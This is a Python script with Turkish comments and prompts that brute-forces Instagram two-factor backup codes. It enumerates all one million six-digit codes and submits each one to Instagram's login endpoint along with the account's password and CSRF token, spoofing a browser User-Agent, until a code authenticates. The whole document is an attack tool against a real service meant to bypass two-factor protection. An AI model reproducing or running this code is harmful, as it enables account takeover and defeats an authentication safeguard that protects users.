import requests
import time
import random

def generate_backup_codes():
    
    return [str(i).zfill(6) for i in range(1000000)]

def login_and_get_csrf_token(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    session = requests.Session()
    
    
    login_payload = {
        'username': username,
        'password': password
    }
    
    
    response = session.post(url, data=login_payload)
    
    if response.status_code == 200 and response.json().get('authenticated'):
        
        csrf_token = session.cookies.get('csrftoken')
        return csrf_token, session
    else:
        print("Giriş başarısız! Kontrol edin.")
        return None, None

def brute_force_backup_codes(username, password, csrf_token, session):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'X-CSRFToken': csrf_token,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    backup_codes = generate_backup_codes()  # Yedek kodları oluştur

    for code in backup_codes:
        data = {
            'username': username,
            'password': password,
            'two_factor_backup_code': code
        }
        
        response = session.post(url, headers=headers, data=data)
        
        if response.status_code == 200:
            response_json = response.json()
            if response_json.get('authenticated'):
                print(f'Yedek kod {code} geçerlidir!')
                return code
            else:
                print(f'Yedek kod {code} geçersiz.')
        else:
            print(f'Hata ile kod {code}: {response.status_code}')
        
        time.sleep(1)  
    return None

def main():
    username = input("Kullanıcı adınızı girin: ")
    password = input("Şifrenizi girin: ")
    
    
    csrf_token, session = login_and_get_csrf_token(username, password)
    
    if csrf_token and session:
       
        valid_code = brute_force_backup_codes(username, password, csrf_token, session)
        
        if valid_code:
            print(f'Geçerli yedek kod bulundu: {valid_code}')
        else:
            print('Geçerli yedek kod bulunamadı.')

if __name__ == '__main__':
    main()
